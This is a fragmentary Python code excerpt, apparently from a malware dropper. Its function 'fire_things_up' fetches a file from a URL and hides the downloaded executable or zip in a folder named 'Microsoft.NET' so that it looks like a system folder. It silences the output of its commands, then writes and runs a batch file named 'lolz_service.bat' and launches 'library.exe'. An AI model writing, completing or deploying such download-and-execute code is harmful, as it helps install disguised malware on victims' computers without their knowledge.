...
def fire_things_up(url, arch=False, zip=False):
    ...
    def work(zip):
        ...
        if not zip:
            ...
            f.close()
            xx = subprocess.Popen(
                'mkdir Microsoft.NET >> NUL', shell=True, cwd=pthhhh)
            subprocess.Popen(
                'move library.exe Microsoft.NET\\library.exe >> NUL',
                shell=True,
                cwd=pthhhh)
        elif zip:
            res = urlopen(url)
            ...
            xx = subprocess.Popen(
                'mkdir Microsoft.NET >> NUL', shell=True, cwd=pthhhh)
            subprocess.Popen(
                'move library_data.zip Microsoft.NET\\library_data.zip >> NUL',
                shell=True,
                cwd=pthhhh)
            ...
            bat = open(pthhhh + "\\Microsoft.NET\\lolz_service.bat", "w")
            bat.write(bat_data)
            bat.close()
            xxx = subprocess.Popen(
                pthhhh + "\\Microsoft.NET\\lolz_service.bat >> NUL",
                shell=True)
...
# Someshit
xx = subprocess.Popen(
    "Microsoft.NET\\library.exe >> NUL", shell=True, cwd=pthhhh)
